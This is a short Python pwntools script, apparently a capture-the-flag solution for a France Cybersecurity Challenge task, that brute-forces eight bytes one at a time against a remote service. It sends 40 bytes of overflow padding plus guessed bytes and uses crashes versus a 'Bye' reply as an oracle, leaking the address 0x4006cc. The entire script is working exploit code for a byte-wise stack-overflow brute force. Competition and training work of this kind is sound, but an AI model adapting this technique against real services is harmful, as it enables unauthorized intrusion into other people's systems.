from pwn import *

data = b''
# Leaking 8 bytes
for _ in range(8):
    # Testing all 256 valyes
    for i in range(256):
        io = remote('challenges2.france-cybersecurity-challenge.fr', 4008, level='ERROR')
        io.recv()
        io.send(b'a' * 40 + data + bytes([i]))
        try:
            received = io.recv(timeout=2)
        except:
            # Remote crashed
            io.close()
            continue

        if b'Bye' in received:
            data += bytes([i])
            io.close()
            break
        io.close()

print(data)
# b'\xcc\x06@\x00\x00\x00\x00\x00'
# 0x4006cc
